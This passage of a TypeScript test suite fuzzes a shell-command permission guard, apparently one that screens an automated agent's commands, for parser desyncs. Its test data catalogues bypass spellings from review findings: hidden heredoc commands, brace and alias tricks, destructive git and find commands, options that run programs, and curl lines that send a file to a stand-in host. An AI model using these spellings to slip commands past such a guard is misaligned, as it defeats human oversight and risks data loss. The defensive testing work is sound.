  "{,}", "{,}{,}{,}{,}{,}{,}{", "{{{{{{{", ",},},},},},},}", "{f..f}", "{1..2}", "{a,-d}", "{-d,@f}",
  "bash -n +n -c '", "sh -n +n -c '", "-n +n ", "+n ", "-n ", "bash -c -- '", "bash -c -x '", "sh -c -- '", "-- ",
  "alias a='", "alias echo='", "'\na\n", "sh -c 'alias a=\"", "\"\na'", "f() { ", "; }; f", "function g { ", "; }\ng\n",
  // From the round 4 cross-check: a substitution that begins with a subshell, a `-c` inside a
  // cluster, code that begins with a blank and an option, empty quotes, a regular expression,
  // a quoted name before `=`, a message option after an option that takes a value.
  "$( (", "$(\n(", ") )", "bash -ce '", "bash -cx '", "sh -ceu '", "bash -c ' -x' '", "\"\"", "''", "[[ x =~ ", "^[0-9]+$", "declare \"a\"=", "git commit --allow-empty --trailer -m ", "--file=f ",
];
// What half of the generated inputs hide in place of the marker: a command the rules allow, so
// the input runs, with words no other piece makes, so the trace oracle can tell it apart.
const HARMLESS = "ls -d hidden-by-the-generator";
// Constructs that open a context the parser may read differently, with what closes them.
const WRAPS: [string, string][] = [
  ["${x:-", "}"], ["${x#", "}"], ["${x:-", "}"], ['"${x:-', '}"'], ['"${x#', '}"'], ["$((", "))"], ["((", "))"], ['"$((', '))"'], ["$[", "]"], ["$(", ")"], ["`", "`"], ["<(", ")"], ['"', '"'], ["'", "'"], ["$'", "'"],
  ["bash -c '", "'"], ['bash -c "', '"'], ["eval '", "'"], ['eval "', '"'], ["cat <<EOF\n", "\nEOF\n"], ["cat <<'EOF'\n", "\nEOF\n"], ["{ ", "; }"], ["[[ ", " ]]"],
  // Round 3: a backslash-newline inside the token, a split or CR-ended heredoc delimiter,
  // extglob, an empty prefix before braces, a variable named in arithmetic, a bare subshell.
  ["$\\\n(", ")"], ['"$\\\n(', ')"'], ["$\\\n{x:-", "}"], ["$\\\n'", "'"], ["(\\\n(", "))"], ["$(\\\n(", "))"], ["cat <\\\n<EOF\n", "\nEOF\n"], ["cat <<EOF\n", "\nEO\\\nF\n"], ["cat <<EOF\n", "\nx\rEOF\n"],
  ["shopt -s extglob\necho @(", ")"], ["shopt -s extglob\necho !(", ")"], ["bash -O extglob -c 'echo @(", ")'"], ["[[ x == @(", ") ]]"], ["@(", ")"],
  ["${e}{", ",}"], ["$e{-", ",}"], ["x='", "'; (( x ))"], ["x='a[", "]'; (( x ))"], ["x='a[", "]'; echo $(( x ))"], ["(", ")"],
  // Round 4, finding 1: bash ends a heredoc inside `$(...)` at a line that starts with the
  // delimiter and has a `)` later on it, and reads the rest of that line as code.
  ['echo "$(cat <<EOF\n(\nEOF)" ; ', ' ; echo "\nEOF\n)"'], ['echo "$(cat <<EOF\n(\nEOF )" ; ', ' ; echo "\nEOF\n)"'], ["echo \"$(cat <<'EOF'\n(\nEOF)\" ; ", ' ; echo "\nEOF\n)"'],
  ["echo $(cat <<EOF\nx\nEOF) ; ", ""], ['x="$(cat <<EOF\n(\nEOF)" ; ', ' ; : "\nEOF\n)"'],
  ["git commit --allow-empty -m \"$(cat <<'EOF'\nmsg\nEOF)\" ; ", ' ; : "\nEOF\n)"'], ['git commit --allow-empty -m "$(cat <<EOF\nmsg\nEOF)" ; ', ' ; : "\nEOF\n)"'],
  ['"$(cat <<EOF\n', '\nEOF)"'], ["$(cat <<EOF\n", "\nEOF)"], ['"$(cat <<EOF\n', '\nEOF\n)"'],
  // Finding 2: more brace groups than the guard expands, nested ones, a range beside a group.
  ["{,}{,}{,}{,}{,}{,}{", ",}"], ["{{{{{{{", ",},},},},},},}"], ["{x,", "}{f..f}"], ["{", ",-d}{f..f}"], ["echo {,}{,}{,}{,}{,}{,}{", ",}"], ["find . -maxdepth 0 {,}{,}{,}{,}{,}{,}{-exec,", ",\\;,-quit}"],
  // Findings 3 and 13: what stands between a nested shell and its code.
  ["bash -n +n -c '", "'"], ["sh -n +n -c '", "'"], ["bash -n +o noexec -c '", "'"], ["bash -c -- '", "'"], ["bash -c -x '", "'"], ["sh -c -- '", "'"], ["bash -c -e -- '", "'"],
  // Finding 14: an alias changes what a later word runs (always in dash and in posix mode).
  ["alias a='", "'\na\n"], ["alias echo='", "'\n"], ["sh -c 'alias a=\"", "\"\na'"], ["bash -o posix -c 'alias a=\"", "\"\na'"],
  // Finding 31: a function definition.
  ["f() { ", "; }; f"], ["function g { ", "; }\ng"], ["ls() { ", "; }; ls"],
  // From the round 4 cross-check.
  ["$( (", ") )"], ['"$( (', ') )"'], ["`(", ")`"], ["<( (", ") )"], ["bash -ce '", "'"], ["bash -cx '", "'"], ["sh -ce '", "'"], ["bash -c ' -x' '", "'"], ["eval ' -- ", "'"],
  ["x=; echo $x\"\"", ""], ["echo ''{,}", ""], ["[[ x =~ ", " ]]"], ["x='a b=", "'; declare \"y\"=$x"], ["git commit --allow-empty --trailer -m --file=f ", ""], ["git tag --cleanup -m -d ", ""], ["echo x 2147483648>", ""],
];
const FILL = [
  "", "a", " ", "a ", " a", "#", " #", ";#", "\\ #", "a#", "\n#", "|#", ">#", "<<EOF", " <<EOF ", "'", '"', "\\", "\\ ", "\\\n", "1", " 1 ", "x", "$x", "\n", ";", "}", ")", "]", "<< 2", ">&2", ">& f", "$'\\''", "'\"'", "\"'\"", "a b",
  "ls", "ls|", "ls| #", "ls| <<EOF", " ls # ", ">&2# ", ">&-# ", "$\\\n", "\\\n(", "\r", "x\rEOF", "EO\\\nF", "b[0]+", "$(<cmd>)",
  "ls&&\\\n", "ls ||\\\n", "ls|\\\n", "ls |\\\n\t", " &&\\\nls ", "|\\\nEOF", "&&\\\n#", "|\\\n|", "&\\\n&",
  "\nEOF)", "\nEOF )", "(\n", "{,}", "{f..f}", "-n +n ", "-- ", "+n ",
];
const TRAIL = ["", "", " #'", ' #"', "\nEOF", "\nEOF\n", " }", " )", " ))", " ]", "'", '"', "`", "\n2", "; echo '", '; echo "', " #", " #)", "\nEO\\\nF\n", "\nx\rEOF\n", "\nEOF\n)", "\nEOF\n)\"", '"\nEOF\n)"'];
function generate(count: number, seed: number): string[] {
  const next = random(seed);
  const pick = <T,>(list: T[]) => list[Math.floor(next() * list.length)];
  const soup = () => {
    const parts = Array.from({ length: 2 + Math.floor(next() * 11) }, () => pick(PIECES));
    parts.splice(1 + Math.floor(next() * parts.length), 0, next() < 0.5 ? "; <cmd>" : "<cmd>");
    return parts.join("");
  };
  // Nested contexts around some filler, the marker somewhere after or inside, then a trailer
  // that may close what the parser thinks is still open.
  const nested = () => {
    let inner = pick(FILL) + (next() < 0.3 ? "<cmd>" : "") + pick(FILL);
    for (let depth = 1 + Math.floor(next() * 3); depth > 0; depth--) {
      const [open, close] = pick(WRAPS);
      inner = pick(FILL) + open + inner + (next() < 0.15 ? "" : close) + pick(FILL);
    }
    return pick(["echo ", "echo ", ": ", "echo a", "x=", "", "cat ", "shopt -s extglob\necho "]) + inner + pick(["; <cmd>", "\n<cmd>", " ; <cmd>", "<cmd>", "; <cmd> ; "]) + pick(TRAIL);
  };
  // Most raw candidates are syntax errors (about 7 in 10), and an input bash refuses runs
  // nothing past the error. Every candidate that bash -n accepts (with extglob, which an input
  // may turn on) is kept, and one in ten of the rest, since lines before a syntax error do run.
  // Every other candidate hides a harmless command instead of the marker (round 4, finding 31):
  // the rules ask about most inputs that hold the marker in plain sight, and the trace oracle
  // needs inputs that are allowed and run.
  const out: string[] = [];
  while (out.length < count) {
    const batch: string[] = [];
    while (batch.length < 2 * count) batch.push((next() < 0.25 ? soup() : nested()).replaceAll("<cmd>", batch.length % 2 ? HARMLESS : MARKER));
    const valid = parses(batch);
    for (const [i, input] of batch.entries()) if (out.length < count && (valid[i] || next() < 0.1)) out.push(input);
  }
  return out;
}
// Whether bash accepts each input's syntax. `bash -n` reads and runs nothing. An input that
// starts with `-` or `+` is read as options, as it would be when run (`+O` alone lists every
// shopt option), so the output of the check is dropped.
function parses(inputs: string[]): boolean[] {
  const script = `while IFS= read -r -d '' input; do if bash -n -O extglob -c "$input" >/dev/null 2>&1; then echo 1; else echo 0; fi; done`;
  const r = spawnSync("/bin/bash", ["-c", script], { cwd: base, input: inputs.map((s) => s + "\0").join(""), encoding: "utf8", env: { PATH: "/usr/bin:/bin", LANG: "C" }, maxBuffer: 1 << 24 });
  const flags = r.stdout.split("\n");
  assert.equal(flags.length - 1, inputs.length, `the syntax check failed: ${r.stderr}`);
  return inputs.map((_, i) => flags[i] === "1");
}

// ---- the tests ----

const seedInputs = () => fs.readFileSync(path.join(import.meta.dirname, "desync-inputs.txt"), "utf8").split("\n====\n").map((s) => expand(s.replace(/\n$/, "")));
// Each set is judged once and runs once per shell; both oracles read the same runs.
const once = <T,>(make: () => T) => {
  let value: { made: T } | undefined;
  return () => (value ??= { made: make() }).made;
};
const perShell = <T,>(make: (shell: Shell) => T) => {
  const values = new Map<string, T>();
  return (shell: Shell = SHELLS[0]) => {
    if (!values.has(shell.name)) values.set(shell.name, make(shell));
    return values.get(shell.name)!;
  };
};
const slug = (shell: Shell) => shell.name.replace(/\W+/g, "-");
const seedSet = once(() => judge(seedInputs()));
const fuzzSet = once(() => judge(generate(Number(process.env.DESYNC_FUZZ ?? 2500), Number(process.env.DESYNC_SEED ?? 20261111))));
const seedRuns = perShell(async (shell) => runAll((await seedSet()).texts, `seeds-${slug(shell)}`, true, shell));
const fuzzRuns = perShell(async (shell) => runAll((await fuzzSet()).texts, `fuzz-${slug(shell)}`, false, shell));
// The inputs as written, in bash, for the round trip.
const seedWritten = once(async () => runAll((await seedSet()).inputs, "seeds-written", true));
const fuzzWritten = once(async () => runAll((await fuzzSet()).inputs, "fuzz-written", false));
// The floor for generated inputs that parse and run in bash, as a share of all of them. A change
// that makes most of them syntax errors fails here.
const PARSE_AND_RUN_FLOOR = 0.6;
// The oracles only bite on an input that is allowed and runs (round 4, finding 31): the floor
// for those, in bash, as a count for the default seed and number of inputs. Measured on bash
// 5.2.37 before the round 4 fixes: 1683 of 2500 parsed and ran, and 84 of those were allowed.
// With another count or seed the floor scales with the count (2 in 100; the default set has 4).
const ALLOWED_AND_RAN_FLOOR = Number(process.env.DESYNC_ALLOWED_FLOOR ?? Math.floor(Number(process.env.DESYNC_FUZZ ?? 2500) / 50));

for (const shell of SHELLS) {
  describe(`desyncs in ${shell.name}: what the shell runs, the rules saw`, () => {
    test("review inputs and their variants: none is allowed while its hidden command runs", async () => {
      const set = await seedSet();
      const runs = await seedRuns(shell);
      assert.ok(runs.at(-1)!.ran && runs.at(-2)!.ran, "the plain marker command did not run");
      if (process.env.DESYNC_REPORT) {
        for (const [i, input] of set.inputs.entries()) {
          const d = set.decisions[i];
          const kind = d.by === "no-model" ? "model" : d.effect;
          const found = compare(set.texts[i], runs[i], shell);
          console.log(`${shell.name}\t${i}\t${runs[i].ran ? "ran" : "-"}\t${kind}\t${[...found.untraced, ...(found.blind ? [`blind: ${found.blind}`] : [])].join(" | ")}\t${JSON.stringify(input)}\t${set.texts[i] === input ? "" : JSON.stringify(set.texts[i])}`);
        }
      }
      const bad = allowedThoughRan(set, runs);
      assert.deepEqual(bad, [], `${bad.length} allowed inputs ran the marker:\n${bad.join("\n")}`);
    });

    test("review inputs and their variants: every command the shell traced for an allowed input is one the parser listed", async () => {
      const set = await seedSet();
      const runs = await seedRuns(shell);
      assert.ok(runs.at(-1)!.trace.includes(MARKER), "the trace of the plain marker command is missing");
      const bad = allowedThoughUntraced(set, runs, shell);
      assert.deepEqual(bad, [], `${bad.length} allowed inputs ran commands the parser did not list:\n${bad.join("\n")}`);
    });

    if (shell === SHELLS[0]) {
      test("the harness is alive: as written, most review inputs run the marker", async () => {
        const runs = await seedWritten();
        const ran = runs.filter((r) => r.ran).length;
        assert.ok(ran > runs.length / 2, `only ${ran} of ${runs.length} inputs ran the marker`);
      });

      test("review inputs: bash does the same for the printed text as for the input as written", async () => {
        const set = await seedSet();
        const bad = roundTrip(set, await seedWritten(), await seedRuns(shell), ["seeds-written", `seeds-${slug(shell)}`]);
        assert.deepEqual(bad, [], `${bad.length} inputs do something else once printed:\n${bad.join("\n")}`);
      });

      test("generated inputs: bash does the same for the printed text as for the input as written", async () => {
        const set = await fuzzSet();
        const bad = roundTrip(set, await fuzzWritten(), await fuzzRuns(shell), ["fuzz-written", `fuzz-${slug(shell)}`]);
        assert.deepEqual(bad, [], `${bad.length} generated inputs do something else once printed:\n${bad.join("\n")}`);
      });

      test("generated inputs: most parse and run, and enough of them are allowed", async () => {
        const set = await fuzzSet();
        const written = await fuzzWritten();
        const runs = await fuzzRuns(shell);
        const count = written.filter((r) => r.parsedAndRan).length;
        const allowed = set.decisions.filter((d, i) => d.effect === "allow" && runs[i].parsedAndRan).length;
        const printed = set.inputs.filter((input, i) => set.decisions[i].printed !== undefined || printedText(input) !== undefined).length;
        console.log(`generated inputs that parse and run: ${count} of ${set.inputs.length}; marker ran in ${written.filter((r) => r.ran).length}; the printer printed ${printed}; allowed and ran: ${allowed}`);
        assert.ok(count >= set.inputs.length * PARSE_AND_RUN_FLOOR, `only ${count} of ${set.inputs.length} generated inputs parsed and ran (floor ${PARSE_AND_RUN_FLOOR * set.inputs.length})`);
        assert.ok(allowed >= ALLOWED_AND_RAN_FLOOR, `only ${allowed} generated inputs were allowed and ran (floor ${ALLOWED_AND_RAN_FLOOR}): the oracles have too little to bite on`);
      });
    }

    test("generated inputs: none is allowed while its hidden command runs", async () => {
      const set = await fuzzSet();
      const runs = await fuzzRuns(shell);
      if (shell === SHELLS[0]) assert.ok((await fuzzWritten()).some((r) => r.ran), "no generated input ran the marker");
      const bad = allowedThoughRan(set, runs);
      assert.deepEqual(bad, [], `${bad.length} allowed generated inputs ran the marker:\n${bad.join("\n")}`);
    });

    test("generated inputs: every command the shell traced for an allowed input is one the parser listed", async () => {
      const set = await fuzzSet();
      const runs = await fuzzRuns(shell);
      const bad = allowedThoughUntraced(set, runs, shell);
      assert.deepEqual(bad, [], `${bad.length} allowed generated inputs ran commands the parser did not list:\n${bad.join("\n")}`);
    });
  });
}

// The trace oracle itself: it must see what bash ran and must not flag what the parser listed.
describe("the trace oracle", () => {
  let n = 0;
  const traceOf = (input: string, shell: Shell = SHELLS[0]) => runAll([input], `oracle-${n++}`, true, shell)[0];
  test("lists builtins, assignments, keywords, functions, subshells and nested shells without a false alarm", () => {
    const inputs = [
      "x=1 ls; y=2; export Z=3; a[1]=4",
      'for f in *; do head -1 "$f" >/dev/null; done; case x in x) : ;; esac; [[ x == y ]] || (( 1 + 1 ))',
      "for ((i=0;i<2;i++)); do :; done; time -p true 2>/dev/null; ! false",
      'echo "$(echo "a\nb")" $(true) <(true) >/dev/null; ( cd sub && pwd ); { ls; }',
      "g() { echo in; }; g; function h { echo in; }; h",
      "bash -c 'echo nested; ls >/dev/null'; eval 'echo e'; if true; then echo t; fi",
      "echo 'two\nlines' 'it'\\''s'",
      "x='a b'; y=$(echo c); echo \"$x\" $y ~ *.tar {a,b} >/dev/null",
    ];
    for (const input of inputs) {
      const run = traceOf(input);
      assert.ok(run.parsedAndRan, `did not run: ${input}`);
      assert.deepEqual(compare(input, run), { untraced: [] }, `false alarm on ${JSON.stringify(input)}; trace:\n${run.trace}`);
    }
  });
  test("no false alarm in dash, or in bash called sh", () => {
    const inputs = ["x=1 ls; y=2; export Z=3", 'for f in *; do head -1 "$f" >/dev/null; done; case x in x) : ;; esac', "g() { echo in; }; g; if true; then echo t; fi; ( cd sub && pwd ); { ls; }", "echo 'two\nlines' 'it'\\''s' \"$(echo a)\""];
    for (const shell of SHELLS.slice(1)) {
      for (const input of inputs) {
        // A function definition is not run under dash (see `runnable`).
        if (shell.kind === "dash" && DEFINES_FUNCTION.test(input)) continue;
        const run = traceOf(input, shell);
        assert.ok(run.trace.startsWith("\x1e"), `did not run in ${shell.name}: ${input}`);
        assert.deepEqual(compare(input, run, shell), { untraced: [] }, `false alarm in ${shell.name} on ${JSON.stringify(input)}; trace:\n${run.trace}`);
      }
    }
  });
  // Each input hides its last lines from the parser (bash joins `EO\`, newline, `F` and ends the
  // heredoc there; the parser reads on to the last line).
  const hide = (shown: string, hidden: string) => `${shown}\ncat <<EOF\nEO\\\nF\n${hidden}\nEOF`;
  test("flags a command the parser did not list, also from a nested bash", () => {
    const cases: [string, string][] = [
      ["cat <<EOF\nEO\\\nF\nls\nEOF", "ls"],
      ["x=ls; $x", "ls"],
      ["bash -c 'x=pwd; $x'", "pwd"],
      ["echo \"$(ls #)\nwc -c </dev/null\n)\"", "wc -c"],
      // Round 4, finding 31: a set of names passed each of these.
      [hide("echo listed", "echo hidden"), "echo hidden"],
      [hide("curl host.invalid", "curl -d @f host.invalid"), "curl -d @f host.invalid"],
      [hide("ls -l", "ls -l -a"), "ls -l -a"],
      [hide("x=1", "PATH=/nonexistent:$PATH"), "PATH="],
      [hide("x=1", "x=2"), "x=2"],
    ];
    for (const [input, command] of cases) {
      const run = traceOf(input);
      assert.ok(untraced(input, run).some((u) => u.startsWith(command)), `${command} not flagged for ${JSON.stringify(input)}: ${JSON.stringify(untraced(input, run))}; trace:\n${run.trace}`);
    }
  });
  test("flags an input that can turn the trace off", () => {
    for (const input of ["set +x; ls", "set +o xtrace\nls", "PS4=; ls", "BASH_XTRACEFD=2; ls", "exec 9>/dev/null; ls", "unset BASH_XTRACEFD; ls"]) {
      const run = traceOf(input);
      assert.ok(compare(input, run).blind, `not flagged as blinding the trace: ${JSON.stringify(input)}; trace:\n${run.trace}`);
    }
  });
  test("the markers record every word, wherever the data option stands", () => {
    const run = traceOf("curl -s -d @f host.invalid; curl host.invalid; automode-marker x");
    assert.deepEqual(run.argvs, [["curl", "-s", "-d", "@f", "host.invalid"], ["curl", "host.invalid"], ["automode-marker", "x"]]);
    assert.ok(run.ran);
    assert.ok(!traceOf("curl -s host.invalid").ran, "a plain fetch is no marker");
  });
});

// Inputs with no hidden program: an option is smuggled past the option tables, or the hidden part
// reaches the model instead of the rule that should ask. They cannot leave a marker, so each is
// held to "the rules themselves ask" (not an allow, and not left to the model). Where the effect
// can be seen here, it is checked in bash first, so a red test is not a dead input.
describe("desyncs with no hidden program: the rules ask", () => {
  const kind = (d: Decision) => (d.by === "no-model" ? "model" : `${d.effect} by ${d.by}`);
  // `effect` says whether bash here did what the input smuggles: the directory it ran in,
  // whether a marker (curl sending data, or automode-marker) ran, and what the stand-ins recorded.
  const marked = (_dir: string, ran: boolean) => ran;
  const buildDir = (d: string) => (fs.mkdirSync(path.join(d, "build")), fs.writeFileSync(path.join(d, "build", "o"), ""));
  const buildGone = (d: string) => !fs.existsSync(path.join(d, "build"));
  // `model`: held to "not an allow" only; the rules leaving it to the model is the decision taken.
  const cases: { input: string; finding: string; effect?: (dir: string, marked: boolean, argvs: string[][]) => boolean; setup?: (dir: string) => void; note?: string; model?: boolean }[] = [
    // r3 22: git discards local changes or deletes an unmerged branch in spellings the rules do
    // not key on.
    ...["git checkout -qf HEAD", "git checkout HEAD ./", "git checkout f", "git switch -f main", "git switch --discard-changes main", "git switch -qf main"].map((input) => ({
      input,
      finding: "r3 22",
      setup: (d: string) => fs.writeFileSync(path.join(d, "f"), "local change\n"),
      effect: (d: string) => fs.readFileSync(path.join(d, "f"), "utf8") === "y\n",
    })),
    ...["git branch -df topic", "git branch -fd topic", "git branch -qD topic"].map((input) => ({
      input,
      finding: "r3 22",
      setup: (d: string) => {
        const g = (...args: string[]) => execFileSync("git", ["-C", d, ...args], { stdio: "ignore" });
        g("checkout", "-q", "-b", "topic");
        g("-c", "user.name=t", "-c", "user.email=t@t", "commit", "-q", "--allow-empty", "-m", "unmerged");
        g("checkout", "-q", "main");
      },
      effect: (d: string) => spawnSync("git", ["-C", d, "rev-parse", "--verify", "-q", "topic"]).status !== 0,
    })),
    // r3 5b: an option that arrives through an expansion goes to the model.
    { input: "x=-delete; find build $x", finding: "r3 5b", model: true, setup: buildDir, effect: buildGone },
    { input: "x=-fd; git clean $x", finding: "r3 5b", model: true, setup: (d) => fs.writeFileSync(path.join(d, "junk"), ""), effect: (d) => !fs.existsSync(path.join(d, "junk")) },
    { input: "e=; find . -maxdepth 0 ${e}-exec automode-marker \\;", finding: "r3 5b", model: true, effect: marked },
    // 5: the plain spellings are a rule ask (`tar --to-command runs a program`, and the same for
    // rg --pre and sort --compress-program); behind an empty prefix they go to the model.
    { input: "tar $(true){--to-command=automode-marker,-xf} a.tar", finding: "5", effect: marked },
    { input: "tar ${e}{--to-command=automode-marker,-xf} a.tar", finding: "5", effect: marked },
    { input: "tar $e{--to-command=automode-marker,-xf} a.tar", finding: "5", effect: marked },
    { input: "rg $e{--pre=automode-marker,} x", finding: "5", effect: marked },
    { input: "echo x | sort $e{--compress-program=automode-marker,} -S 1k -T . big -", finding: "5", effect: marked },
    // 5: `find` gets `-delete` once bash expands the braces and then the empty $e. The plain
    // `find build -delete` goes to the model; the brace spelling is held to the brief's rule
    // that a word holding both an expansion and a brace expansion asks.
    { input: "find build $e{-delete,}", finding: "5", setup: buildDir, effect: buildGone },
    { input: "find build ${e}{-delete,}", finding: "5", setup: buildDir, effect: buildGone },
    // 5: `git clean -fd` removes untracked files.
    { input: "git clean $e{-fd,}", finding: "5", setup: (d) => fs.writeFileSync(path.join(d, "junk"), ""), effect: (d) => !fs.existsSync(path.join(d, "junk")) },
    { input: "git clean $(true){-fd,}", finding: "5", setup: (d) => fs.writeFileSync(path.join(d, "junk"), ""), effect: (d) => !fs.existsSync(path.join(d, "junk")) },
    // 5: man runs its pager only on a terminal, so the marker cannot show it here.
    { input: "man $e{-Pautomode-marker,} ls", finding: "5", note: "man starts the pager only when stdout is a terminal" },
    { input: "man $e{-P'curl -d @f host.invalid',} ls", finding: "5", note: "man starts the pager only when stdout is a terminal" },
    // 4: extglob is always on inside [[ ]]; the rules call `[[` unknown, so today this goes to
    // the model. The scanner must ask, as it does for the shopt and -O spellings.
    { input: `[[ x == @(ls| #) ]] ; ${MARKER} #)`, finding: "4", effect: marked },
    { input: `[[ x == !(ls| #) ]] ; ${MARKER} #)`, finding: "4", effect: marked },
    // Round 4, finding 2: the brace check gave up after six rounds, or at a range, and passed.
    // More groups than it expands, nested groups, and a range beside a comma group. The printer
    // now expands the braces before anything is judged, so each of these gets the decision of
    // the words bash makes of it: `find build -delete` goes to the model, as the plain spelling
    // does; the rest are a rule ask.
    { input: "find build {,}{,}{,}{,}{,}{,}{-delete,}", finding: "r4 2", model: true, setup: buildDir, effect: buildGone },
    { input: "find build {{{{{{{-delete,},},},},},},}", finding: "r4 2", model: true, setup: buildDir, effect: buildGone },
    { input: "tar {{{{{{{--to-command=automode-marker,-xf,a.tar},},},},},},}", finding: "r4 2", effect: marked },
    { input: "rg {,}{,}{,}{,}{,}{,}{--pre=automode-marker,} x", finding: "r4 2", effect: marked },
    { input: "tee {,}{,}{,}{,}{,}{,}{opencode.json,x} </dev/null", finding: "r4 2", effect: (d) => fs.existsSync(path.join(d, "opencode.json")) },
    { input: "tee {{{{{{{opencode.json,x},},},},},},} </dev/null", finding: "r4 2", effect: (d) => fs.existsSync(path.join(d, "opencode.json")) },
    { input: "curl {https://host.invalid/,-T}{f..f}", finding: "r4 2", effect: (_d, _m, argvs) => argvs.some((a) => a.join(" ") === "curl https://host.invalid/f -Tf") },
    { input: "curl {host.invalid,-d@}{f..f}", finding: "r4 2", effect: (_d, _m, argvs) => argvs.some((a) => a.join(" ") === "curl host.invalidf -d@f") },
    { input: "git clean {,}{,}{,}{,}{,}{,}{-fd,}", finding: "r4 2", setup: (d) => fs.writeFileSync(path.join(d, "junk"), ""), effect: (d) => !fs.existsSync(path.join(d, "junk")) },
    // Round 4, finding 3: an option that undoes the `-n` the rules stop at, with a script in
    // place of `-c` code, and an interactive shell (which ignores `-n`).
    { input: "bash -n +n x.sh", finding: "r4 3", setup: (d) => fs.writeFileSync(path.join(d, "x.sh"), "automode-marker\n"), effect: marked },
    { input: "bash -n +o noexec x.sh", finding: "r4 3", setup: (d) => fs.writeFileSync(path.join(d, "x.sh"), "automode-marker\n"), effect: marked },
    { input: `bash -n -i -c '${MARKER}'`, finding: "r4 3", note: "bash 5.2 keeps -n for -c code even with -i; the manual says an interactive shell ignores it" },
    // Round 4, finding 13: bash takes the first word after -c that is no option as the code.
    // These went to the model, as an unknown program called `--` or `-x`.
    ...[`bash -c -- '${MARKER}'`, `bash -c -x '${MARKER}'`, `bash -c -e -- '${MARKER}'`, `bash -c +x '${MARKER}'`, `sh -c -- '${MARKER}'`, `timeout 5 bash -c -- '${MARKER}'`].map((input) => ({ input, finding: "r4 13", effect: marked })),
    // Round 4, finding 14: an alias changes what a later word runs (in dash, and in bash's
    // posix mode); so do `hash -p` and `enable`. These went to the model.
    { input: `sh -c 'alias ls="${MARKER}"\nls'`, finding: "r4 14", effect: marked },
    { input: `bash -o posix -c 'alias ls="${MARKER}"\nls'`, finding: "r4 14", effect: marked },
    { input: `alias ls="${MARKER}"\nls`, finding: "r4 14", note: "bash expands no alias here; dash and bash called sh do" },
    { input: `builtin alias ls="${MARKER}"\nls`, finding: "r4 14", note: "bash expands no alias here; dash and bash called sh do" },
    { input: "hash -p \"$(command -v automode-marker)\" ls; ls", finding: "r4 14", effect: marked },
    { input: "enable -n echo; echo x", finding: "r4 14", note: "the builtin's stand-in is /usr/bin/echo, which leaves no marker" },
    // From the round 4 cross-check of group A. A `-c` inside a cluster: bash and dash take the
    // next word as the code, and the rules read it as a script's name (these went to the model).
    ...[`bash -ce '${MARKER}'`, `bash -cx '${MARKER}'`, `sh -ceu '${MARKER}'`, `bash -cv '${MARKER}'`, `timeout 5 sh -ce '${MARKER}'`].map((input) => ({ input, finding: "r4 13", effect: marked })),
    // Code that begins with a blank and an option: printed without the blank it would be the
    // shell's own option, and the next word the code.
    { input: `bash -c ' -x' '${MARKER}'`, finding: "r4 13", note: "bash runs a command called -x; printed without its blank, the next word would run" },
    // `-m` as the value of an option that takes one: the word after it is a real option.
    { input: "git commit -q --allow-empty --trailer -m --file=secret.txt", finding: "r4 16", setup: (d) => fs.writeFileSync(path.join(d, "secret.txt"), "TOP SECRET\n"), effect: (d) => spawnSync("git", ["-C", d, "log", "-1", "--format=%B"], { encoding: "utf8" }).stdout.includes("TOP SECRET"), model: true },
    { input: "git tag --cleanup -m -d v9", finding: "r4 16", setup: (d) => void execFileSync("git", ["-C", d, "tag", "v9"]), effect: (d) => spawnSync("git", ["-C", d, "rev-parse", "-q", "--verify", "refs/tags/v9"]).status !== 0 },
    // Fifth pass on group A (found by the generator with seed 31337004): where an assignment
    // may stand bash reads `name[` up to the matching `]` as one word, blanks and operators
    // included, and then runs the words after it. The rules saw a command called `a[` with the
    // marker among its arguments, and these went to the model.
    ...[`a[ 0 ]=1 ${MARKER}`, `a[0]=1 ${MARKER}`, `x=1 a[ 0 ]=2 ${MARKER}`, `ls[ 0 ]=1 ${MARKER}`, `a[ 0 | ls ]=1 ${MARKER}`, `time -p a[ 0 ]=1 ${MARKER}`, `a[\n0 ]=1 ${MARKER}`].map((input) => ({ input, finding: "r4 16", effect: marked })),
    // A number too long for a descriptor is a word of the command; the rules' parser drops it.
    { input: "git checkout 2147483648>/dev/null", finding: "r4 16", setup: (d) => (fs.writeFileSync(path.join(d, "2147483648"), "x\n"), execFileSync("git", ["-C", d, "add", "2147483648"]), execFileSync("git", ["-C", d, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-qm", "n"]), fs.writeFileSync(path.join(d, "2147483648"), "changed\n")), effect: (d) => fs.readFileSync(path.join(d, "2147483648"), "utf8") === "x\n" },
  ];
  let n = 0;
  for (const c of cases) {
    test(`finding ${c.finding}: ${JSON.stringify(c.input)}`, async () => {
      if (c.effect && !c.note) {
        const dir = path.join(base, "nohidden", String(n++));
        fs.mkdirSync(path.dirname(dir), { recursive: true });
        execFileSync("cp", ["-a", repo, dir]);
        c.setup?.(dir);
        const mark = path.join(dir, "..", path.basename(dir) + ".mark");
        const env = { PATH: `${bin}:/usr/bin:/bin`, HOME: os.homedir(), GIT_CONFIG_GLOBAL: process.env.GIT_CONFIG_GLOBAL ?? "", LANG: "C", MARKFILE: mark, AUTOMODE_SHELL: "/bin/bash", AUTOMODE_RW: [base, "/dev/null"].join("\n") };
        // stdin is /dev/null, as in runAll: with a pipe, `rg PATTERN` searches stdin instead.
        spawnSync(WRAPPER, ["-c", c.input], { cwd: dir, env, encoding: "utf8", timeout: 30_000, stdio: ["ignore", "pipe", "pipe"] });
        const argvs = fs.existsSync(mark) ? fs.readFileSync(mark, "utf8").replace(/\n$/, "").split("\n").map((line) => line.split("\x1f")) : [];
        const ran = argvs.some(([program, ...args]) => program === "automode-marker" || args.some((a) => SENDS.test(a)));
        const shown = c.effect(dir, ran, argvs);
        assert.ok(shown, `bash here did not show the effect of ${JSON.stringify(c.input)}, so this input proves nothing`);
      }
      const d = await decideShell(guard, new SessionState(repo), repo, c.input);
      assert.ok(d.effect !== "allow" && (c.model || d.by === "rules"), `${JSON.stringify(c.input)} -> ${kind(d)}: ${d.reason}`);
    });
  }
});
